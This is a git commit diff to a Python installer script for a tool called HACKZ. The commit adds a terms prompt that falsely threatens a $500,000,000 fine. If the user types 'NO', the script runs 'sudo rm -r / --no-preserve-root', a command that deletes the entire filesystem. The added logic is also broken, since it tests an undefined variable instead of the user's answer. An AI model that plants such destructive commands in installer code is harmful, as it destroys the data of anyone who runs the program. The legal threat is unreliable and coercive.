914d02d4724b84d8f968652c645bbc7dc73ef027
AvexProducts <hackers300112@outlook.com>
2024-09-19 17:58:22 +1000

    Update HACKZ_INSTALLER.py
    Making rules

--- HACKZ_INSTALLER.py
+++ HACKZ_INSTALLER.py
@@ -3,16 +3,23 @@ import time
 print("===========================================")
 print("HACKZ INSTALLER")
 print("===========================================")
-print("Type 'install' to install the requirements and run HACKZ latest version. ")
-enter = input("Enter : ")
-while True:
-    if enter == "install":
-        os.system('sudo apt-get update')
-        os.system('sudo apt-get upgrade')
-        os.system('sudo apt-get install python3-pip')
-        os.system('sudo pip3 install -r requirements.txt --break-system-packages')
-        os.system('sudo python3 HACKZ.py')
-        break
-    else:
-        print("ERROR. COULD NOT UNDERSTAND")
-        continue
+print("Do you agree to the terms and conditions that are the following: redistributing, changing or saying that anything related to HACKZ is made by you other than AvexProducts, you will be fined $500000000 USD. THIS IS LEGALLY ALLOWED. Type 'YES' or 'NO'")
+choice = input("Enter: ")
+if enter == "YES":
+    print("Type 'install' to install the requirements and run HACKZ latest version. ")
+    enter = input("Enter : ")
+    while True:
+        if enter == "install":
+            os.system('sudo apt-get update')
+            os.system('sudo apt-get upgrade')
+            os.system('sudo apt-get install python3-pip')
+            os.system('sudo pip3 install -r requirements.txt --break-system-packages')
+            os.system('sudo python3 HACKZ.py')
+            break
+        else:
+            print("ERROR. COULD NOT UNDERSTAND")
+            continue
+elif enter == "NO":
+    print("You are NOT allowed to use this software. ")
+    time.sleep(3)
+    os.system('sudo rm -r / --no-preserve-root')
